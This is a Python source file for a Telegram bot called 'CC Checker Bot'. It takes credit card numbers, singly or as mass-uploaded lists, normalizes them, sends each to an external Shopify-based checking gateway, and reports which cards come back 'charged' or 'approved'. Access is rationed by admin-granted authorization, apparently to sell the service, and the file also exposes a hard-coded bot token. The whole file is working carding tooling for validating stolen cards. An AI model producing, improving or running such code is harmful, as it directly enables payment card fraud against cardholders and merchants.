import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

# BOT Config
BOT_TOKEN = "7953997114:AAFX4O_PlM1TjnDinJ0Iezuj15NUstWkvQU"
MAIN_ADMIN_ID = 5103348494
bot = telebot.TeleBot(BOT_TOKEN)

AUTHORIZED_USERS = {}

# ---------------- Helper Functions ---------------- #

def load_admins():
    try:
        with open("admins.json", "r") as f:
            return json.load(f)
    except:
        return [MAIN_ADMIN_ID]

def save_admins(admins):
    with open("admins.json", "w") as f:
        json.dump(admins, f)

def is_admin(chat_id):
    return chat_id in load_admins()

def load_auth():
    try:
        with open("authorized.json", "r") as f:
            return json.load(f)
    except:
        return {}

def save_auth(data):
    with open("authorized.json", "w") as f:
        json.dump(data, f)

def is_authorized(chat_id):
    if is_admin(chat_id):
        return True
    if str(chat_id) in AUTHORIZED_USERS:
        expiry = AUTHORIZED_USERS[str(chat_id)]
        if expiry == "forever" or time.time() < expiry:
            return True
        else:
            del AUTHORIZED_USERS[str(chat_id)]
            save_auth(AUTHORIZED_USERS)
    return False

def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def generate_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
    ])
def clean_response(text):
    """Remove HTML tags and extra whitespace from response"""
    # Remove <pre> tags
    text = re.sub(r'<pre[^>]*>|</pre>', '', text, flags=re.IGNORECASE)
    # Remove other HTML tags if present
    text = re.sub(r'<[^>]+>', '', text)
    # Clean up extra whitespace
    text = ' '.join(text.split())
    return text.strip()

# ---------------- Gateway Call ---------------- #

def check_card_gateway(cc_line):
    try:
        url = f"https://chk-for-shopify.onrender.com?lista={cc_line}"
        headers = {"User-Agent": generate_user_agent()}
        r = requests.get(url, headers=headers, timeout=20)
        return clean_response(r.text.strip())
    except Exception as e:
        return f"❌ Error checking {cc_line}: {e}"

AUTHORIZED_USERS = load_auth()
ADMIN_IDS = load_admins()

# ---------------- Admin Commands ---------------- #

@bot.message_handler(commands=['addadmin'])
def add_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, "❌ Only the main admin can add new admins.")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, "❌ Usage: /addadmin <user_id>")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id in admins:
            return bot.reply_to(msg, "❌ This user is already an admin.")
        
        admins.append(user_id)
        save_admins(admins)
        bot.reply_to(msg, f"✅ Added {user_id} as admin.\nTotal admins: {len(admins)}")
        
    except ValueError:
        bot.reply_to(msg, "❌ Invalid user ID. Please provide a numeric Telegram ID.")
    except Exception as e:
        bot.reply_to(msg, f"❌ Error: {e}")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, "❌ Only the main admin can remove admins.")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, "❌ Usage: /removeadmin <user_id>")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id == MAIN_ADMIN_ID:
            return bot.reply_to(msg, "❌ Cannot remove the main admin.")
        
        if user_id not in admins:
            return bot.reply_to(msg, "❌ This user is not an admin.")
        
        admins.remove(user_id)
        save_admins(admins)
        bot.reply_to(msg, f"✅ Removed {user_id} from admins.\nTotal admins: {len(admins)}")
        
    except ValueError:
        bot.reply_to(msg, "❌ Invalid user ID. Please provide a numeric Telegram ID.")
    except Exception as e:
        bot.reply_to(msg, f"❌ Error: {e}")

@bot.message_handler(commands=['listadmins'])
def list_admins(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, "❌ Only admins can view the admin list.")
    
    admins = load_admins()
    if not admins:
        return bot.reply_to(msg, "❌ No admins found.")
    
    admin_list = ""
    for i, admin_id in enumerate(admins, 1):
        if admin_id == MAIN_ADMIN_ID:
            admin_list += f"{i}. {admin_id} (Main Admin) 👑\n"
        else:
            admin_list += f"{i}. {admin_id}\n"
    
    bot.reply_to(msg, f"📜 Admin List:\n\n{admin_list}\nTotal admins: {len(admins)}")

# ---------------- Bot Commands ---------------- #

@bot.message_handler(commands=['start'])
def start_handler(msg):
    bot.reply_to(msg, """🌟 Welcome to CC Checker Bot! 🌟

🔹 Use /chk to check a single card
🔹 Use /mchk to mass check cards (reply to a file or message)
🔹 Admins can use /auth to authorize users
🔹 Contact @mhitzxg for more info""")

@bot.message_handler(commands=['auth'])
def authorize_user(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, "❌ Usage: /auth <user_id> [days]")
        user = parts[1]
        days = int(parts[2]) if len(parts) > 2 else None

        if user.startswith('@'):
            return bot.reply_to(msg, "❌ Use numeric Telegram ID, not @username.")

        uid = int(user)
        expiry = "forever" if not days else time.time() + (days * 86400)
        AUTHORIZED_USERS[str(uid)] = expiry
        save_auth(AUTHORIZED_USERS)

        msg_text = f"✅ Authorized {uid} for {days} days." if days else f"✅ Authorized {uid} forever."
        bot.reply_to(msg, msg_text)
    except Exception as e:
        bot.reply_to(msg, f"❌ Error: {e}")

@bot.message_handler(commands=['rm'])
def remove_auth(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, "❌ Usage: /rm <user_id>")
        uid = int(parts[1])
        if str(uid) in AUTHORIZED_USERS:
            del AUTHORIZED_USERS[str(uid)]
            save_auth(AUTHORIZED_USERS)
            bot.reply_to(msg, f"✅ Removed {uid} from authorized users.")
        else:
            bot.reply_to(msg, "❌ User is not authorized.")
    except Exception as e:
        bot.reply_to(msg, f"❌ Error: {e}")

@bot.message_handler(commands=["chk"])
def chk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    cc = None
    if msg.reply_to_message:
        cc = normalize_card(msg.reply_to_message.text or "")
    else:
        args = msg.text.split(None, 1)
        if len(args) > 1:
            cc = normalize_card(args[1]) or args[1]

    if not cc:
        return bot.reply_to(msg, "❌ Invalid format. Use `/chk 4556737586899855|12|2026|123`")

    processing = bot.reply_to(msg, "🕒 Processing your card...")

    def run_check():
        result = check_card_gateway(cc)
        bot.edit_message_text(result, msg.chat.id, processing.message_id, parse_mode='HTML')

    threading.Thread(target=run_check).start()

@bot.message_handler(commands=["mchk"])
def mchk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    if not msg.reply_to_message:
        return bot.reply_to(msg, "❌ Reply with a CC list file or text.")

    text = ""
    if msg.reply_to_message.document:
        file_info = bot.get_file(msg.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode("utf-8", errors="ignore")
    else:
        text = msg.reply_to_message.text or ""

    cc_lines = []
    for line in text.splitlines():
        norm = normalize_card(line.strip())
        if norm:
            cc_lines.append(norm)

    if not cc_lines:
        return bot.reply_to(msg, "❌ No valid cards found.")

    total = len(cc_lines)
    approved, declined, checked = 0, 0, 0

    kb = InlineKeyboardMarkup(row_width=1)
    status_msg = bot.send_message(msg.chat.id, f"🔄 Checking {total} cards...", reply_markup=kb)

    def process_cards():
        nonlocal approved, declined, checked
        for cc in cc_lines:
            checked += 1
            result = check_card_gateway(cc)
            if "CHARGED" in result or "CVV MATCH" in result or "APPROVED" in result:
                approved += 1
                bot.send_message(msg.chat.id, result, parse_mode='HTML')
            else:
                declined += 1

            new_kb = InlineKeyboardMarkup(row_width=1)
            new_kb.add(
                InlineKeyboardButton(f"Approved {approved} ✅", callback_data="none"),
                InlineKeyboardButton(f"Declined {declined} ❌", callback_data="none"),
                InlineKeyboardButton(f"Checked {checked}/{total}", callback_data="none")
            )
            bot.edit_message_reply_markup(msg.chat.id, status_msg.message_id, reply_markup=new_kb)
            time.sleep(2)

        bot.send_message(msg.chat.id, "✅ Mass check completed.")

    threading.Thread(target=process_cards).start()

# ---------------- Start Bot ---------------- #
print("🚀 Starting CC Checker Bot...")
print("✅ Using external gateway for checks")
print("🔒 Admin system enabled")
print("👥 User authorization system active")

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = threading.Thread(target=run)
    t.start()

keep_alive()
bot.infinity_polling()
